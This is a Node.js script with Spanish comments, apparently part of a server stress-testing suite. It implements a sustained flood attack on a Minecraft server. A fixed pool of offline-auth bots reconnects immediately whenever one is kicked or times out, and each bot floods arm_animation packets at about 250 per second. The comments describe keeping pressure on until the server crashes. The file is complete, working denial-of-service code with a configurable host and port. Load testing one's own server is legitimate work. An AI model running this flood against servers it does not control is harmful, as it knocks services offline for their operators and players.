// Inundacion sostenida con reconexion, separada de server_stress y packet_storm.
//
// Las corridas anteriores eran autolimitantes: al atrasarse, el servidor expulsa
// a los bots por "Timed out" y, al bajar la carga, se recupera. Este ataque
// mantiene un pool fijo de bots: cuando uno cae (timeout, kick), se lanza otro de
// inmediato, de modo que la presion no baja en ningun momento. Cada bot entra,
// confirma el spawn, no se mueve (para no gatillar kicks de movimiento) e inunda
// arm_animation a alta tasa. Pensado para la prueba de caida SIN proxy.
//
// Uso: node src/flood.mjs --port 25566 --bots 200 --duration 90 --rate-ms 4

import protocol from 'minecraft-protocol';
import { resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parseArgs } from 'node:util';

const DEFAULTS = { host: '127.0.0.1', port: 25566, version: '26.1' };

export async function flood(options = {}) {
  const { host, port, version } = { ...DEFAULTS, ...options };
  const poolSize = options.bots ?? 200;
  const durationMs = (options.durationSec ?? 90) * 1000;
  const intervalMs = options.intervalMs ?? 4;    // ~250 paquetes/s por bot
  const start = performance.now();
  const deadline = Date.now() + durationMs;

  let connections = 0;   // conexiones totales lanzadas (incluye reconexiones)
  let packets = 0;
  let current = 0;       // bots vivos ahora
  let peak = 0;          // maximo de bots simultaneos
  let timeouts = 0;      // caidas por desconexion del servidor

  let drained;
  const done = new Promise(res => { drained = res; });

  function spawnBot(index) {
    if (Date.now() >= deadline) { if (current === 0) drained(); return; }
    connections++;
    current++; peak = Math.max(peak, current);

    const username = `flood_${index}_${Math.random().toString(36).slice(2, 6)}`;
    const client = protocol.createClient({ host, port, version, username, auth: 'offline', keepAlive: false });
    let open = true;

    function closed() {
      if (!open) return;
      open = false;
      current--;
      if (Date.now() < deadline) spawnBot(index);   // reconexion inmediata
      else if (current === 0) drained();
    }

    client.on('error', () => {});
    client.once('end', () => { timeouts++; closed(); });
    client.on('position', data => {
      if (data.teleportId !== undefined) {
        try { client.write('teleport_confirm', { teleportId: data.teleportId }); } catch {}
      }
    });

    client.once('playerJoin', async () => {
      try { client.write('position', { x: 0, y: 64, z: 0, flags: { onGround: true, hasHorizontalCollision: false } }); } catch {}
      while (open && Date.now() < deadline) {
        try {
          client.write('arm_animation', { hand: 'main_hand' });
          packets++;
        } catch { break; }
        await new Promise(r => setTimeout(r, intervalMs));
      }
      if (open) client.end('fin');
    });
  }

  for (let i = 0; i < poolSize; i++) spawnBot(i);

  // Red de seguridad: si algo queda colgado, cierra al pasar el plazo + 15 s.
  const guard = setTimeout(() => drained(), durationMs + 15_000);
  await done;
  clearTimeout(guard);

  const elapsedS = (performance.now() - start) / 1000;
  return {
    attack: 'flood',
    poolSize,
    conexionesTotales: connections,
    reconexiones: connections - poolSize,
    caidasServidor: timeouts,
    picoSimultaneo: peak,
    packets,
    paquetesPorSegundo: Math.round(packets / elapsedS),
    elapsedMs: Math.round(performance.now() - start),
  };
}

async function main() {
  const { values } = parseArgs({ options: {
    host: { type: 'string', default: '127.0.0.1' },
    port: { type: 'string', default: '25566' },
    version: { type: 'string', default: '26.1' },
    bots: { type: 'string' },
    duration: { type: 'string' },
    'rate-ms': { type: 'string' },
    help: { type: 'boolean', default: false },
  } });
  if (values.help) {
    process.stdout.write('uso: node src/flood.mjs --port 25566 --bots 200 --duration 90 --rate-ms 4\n');
    process.exit(0);
  }
  const options = { host: values.host, port: Number(values.port), version: values.version };
  if (values.bots) options.bots = Number(values.bots);
  if (values.duration) options.durationSec = Number(values.duration);
  if (values['rate-ms']) options.intervalMs = Number(values['rate-ms']);

  const summary = await flood(options);
  process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
  process.exit(0);
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main().catch(e => { process.stderr.write(`error: ${e.message}\n`); process.exit(1); });
}
